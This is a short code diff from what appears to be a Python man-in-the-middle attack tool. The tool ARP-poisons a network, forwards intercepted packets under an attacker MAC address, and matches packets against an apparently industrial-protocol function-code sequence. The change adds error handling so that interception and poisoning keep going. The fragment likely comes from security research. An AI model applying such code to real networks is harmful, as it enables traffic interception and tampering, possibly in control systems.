@@ -388,7 +388,13 @@ def handlePacketAttacking(pkt):
             poisonARP(1, False)
         return False
 
-    pkt_funcCode = pkt.funcCode
+    try:
+        pkt_funcCode = pkt.funcCode
+    except:
+        forwardPacket(pkt,cs.socket,dstHA,cs.attackerMAC)
+        if cs.packetCount%2 == 0:
+            poisonARP(1, False)
+        return False
     localcount = av.packetCount + 1
     if(localcount == len(lv.fullSeq) - 1): return True;
     while not (pkt_funcCode == lv.fullSeq[localcount].funcCode and pkt_src == lv.fullSeq[localcount][IP].src):
